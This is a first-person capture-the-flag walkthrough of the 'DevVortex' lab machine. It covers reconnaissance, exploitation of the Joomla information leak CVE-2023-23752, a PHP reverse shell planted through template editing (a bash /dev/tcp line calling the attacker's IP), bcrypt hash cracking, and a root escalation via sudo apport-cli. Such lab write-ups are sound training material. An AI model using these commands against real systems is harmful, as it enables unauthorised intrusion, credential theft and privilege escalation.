
## **Reconnaissance and Initial Steps**

The journey began with an nmap scan:

```
# Nmap 7.94 scan initiated Wed Dec  6 12:30:49 2023 as: nmap -v -sC -sV -oN nmap/10.10.11.242 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  6 12:32:05 2023 -- 1 IP address (1 host up) scanned in 75.89 seconds
```

Key findings:

- SSH (Port 22): OpenSSH 8.2p1 on Ubuntu.
- HTTP (Port 80): Nginx 1.18.0 on Ubuntu, redirecting to http://devvortex.htb/.

The IP address and domain were added to /etc/hosts:

```
echo "10.10.14.242 devvortex.htb" | sudo tee -a /etc/hosts
```

## **Initial Foothold**

Exploration of devvortex.htb was initially unfruitful.

![Initial Foothold](https://images.prismic.io/superpupertest/14db6b5d-a84d-4473-a354-3278f60d136c_devvortex.main.page.png?auto=format&w=680&h=471.613&dpr=3)

The first significant step was directory enumeration using Gobuster:

```
gobuster dir -u http://devvortex.htb/ -w $wordlists/content/dirs-and-files-medium.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /Users/mekaneo/Hacking/wordlists/content/dirs-and-files-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/12/08 17:32:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
===============================================================
2023/12/08 17:32:51 Finished
===============================================================
```

Nothing interesing found. DNS subdomain enumeration revealed dev.devvortex.htb:

```
gobuster dns -d devvortex.htb -w $wordlists/dns/subdomains-top1million-20000.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    20
[+] Timeout:    1s
[+] Wordlist:   /Users/mekaneo/Hacking/wordlists/dns/subdomains-top1million-20000.txt
===============================================================
2023/12/08 17:37:57 Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devvortex.htb

Progress: 1013 / 19967 (5.07%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/12/08 17:38:02 Finished
===============================================================
```

#### **Found: dev.devvortex.htb**

I've added it to my **/etc/hosts** and proceeded to explore this website. Hitting /robots.txt revealed it's content and it became clear: this is a Joomla CMS.

![Found: dev.devvortex.htb](https://images.prismic.io/superpupertest/0843a46c-5aba-45cf-a55b-d3344d3d9d50_dev.devvortex.robots.page.png?auto=format&w=680&h=469.550&dpr=3)

![dev.devvortex](https://images.prismic.io/superpupertest/34e533a2-ff61-42cd-95c2-66fab7ab631c_dev.devvortex.admin.page.png?auto=format&w=680&h=471.022&dpr=3)

Attempts with common credentials on the Joomla login page were unsuccessful.

#### **CVE-2023-23752 to code execution**

From [VulnCheck](https://vulncheck.com/blog/joomla-for-rce):

```
On February 16, 2023, Joomla! published a security advisory for CVE-2023-23752. The advisory describes an “improper access check” affecting Joomla! 4.0.0 through 4.2.7. The following day, a chinese-language blog shared the technical details of the vulnerability. The blog describes an authentication bypass that allows an attacker to leak privileged information.
```

Leveraging CVE-2023-23752 in Joomla:

#### **Request**

```
curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq .
```

#### **Response**

```
{
  ...
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
   ...
}
```

First thing I tried, is to SSH into the server with those, but my attempt failed. After all, these credentials enabled Joomla Administrator dashboard access:

![Administrator dashboard access](https://images.prismic.io/superpupertest/78dc96bd-dad4-4cf1-a5fc-156d6db73bcd_dev.devvortex.admin-dashboard.page.png?auto=format&w=680&h=471.781&dpr=3)

From here, I knew, executing PHP code is easy and requires template editing. I went to **System**->**Templates**->**Administrator Templates**->**index.php**

![Administrator Templates](https://images.prismic.io/superpupertest/294334cd-a509-4456-91eb-17d1bb62152f_dev.devvortex.admin-templates-edit.page.png?auto=format&w=680&h=470.853&dpr=3)

PHP reverse shell execution through template editing:

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
```

Establishing a connection using netcat:

```
nc -l 4444
```

![Establishing a connection using netcat](https://images.prismic.io/superpupertest/230b266d-43f5-4641-9d7b-0eeb302d2361_stabilize-rev-shell.png?auto=format&w=680&h=329.993&dpr=3)

Stabilizing the shell:

```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
```

Now, I had a properly working shell, but my current user couldn't read the user flag:

```
www-data@devvortex:~/dev.devvortex.htb/administrator$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## **Privilege Escalation "www-data" -> "rogan"**

Knowing that the credentials obtained from exploiting the Joomla information leak vulnerability were for MySQL, I proceeded to connect to MySQL to explore the users' table:

```
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 26575
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5k--------------------------------------/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

In the users' table, I found another user, logan, with a BCrypt hashed password. To crack this hash, I created a file named hash.txt, placed the hash inside, and initiated the attack using John the Ripper:

```
john --format=bcrypt --wordlist=$wordlists/passwords/rockyou.txt hash.txt
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 0% 0g/s 52.88p/s 52.88c/s 52.88C/s billabong..froggy
teq-------cho    (?)
1g 0:00:00:26 100% 0.03763g/s 52.84p/s 52.84c/s 52.84C/s leelee..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password was cracked in less than 20 seconds: teq-------cho.

I then SSHed into the box using these new credentials:

![SSHed](https://images.prismic.io/superpupertest/87119f37-0799-4ee8-b716-d2a9e388db9c_devvortex.ssh.logan.png?auto=format&w=680&h=300.393&dpr=3)

```
cat users.txt
bbb1****************ef4a
```

## **Privilege Escalation "rogan" -> "root"**

The first thing I did as a user was to list logan's sudo privileges:

```
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

I could run `/usr/bin/apport-cliwith` sudo, but needed to figure out how to exploit it. Quick research revealed a CVE:

```
A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.
```

This was exactly my case, so I started exploring.

https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb?source=post_page-----605d60f2d5ef--------------------------------

```
logan@devvortex:~$ sudo /usr/bin/apport-cli
No pending crash reports. Try --help for more information.
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```

It was clear I could either create crash reports or read any existing ones on the system. Since there were none, I decided to create my own report:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

***

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue...

..dpkg-query: no packages found matching xorg
.................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):
```

By choosing to view the report, a Vi-like editor appeared, and I immediately remembered that by passing the !:command syntax, I could execute code. Since I was running the binary in a privileged context, I could gain root access by executing !/bin/bash:

![view the report](https://images.prismic.io/superpupertest/5e9ed46e-4c23-4d26-b998-e553f737abdd_devvortex.vim.exec.shell.png?auto=format&w=680&h=384.188&dpr=3)

I successfully gained root access and accessed the root.txt file:

```
What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:/home/logan# cat ~/root.txt
37c6************************0d3a
```

## **Conclusion**

The DevVortex box presented a challenging and educational experience, highlighting the importance of meticulous reconnaissance, vulnerability exploitation, and creative problem-solving in privilege escalation. This journey from an initial nmap scan to obtaining root access underscores the complexities and excitement inherent in penetration testing and cybersecurity exploration.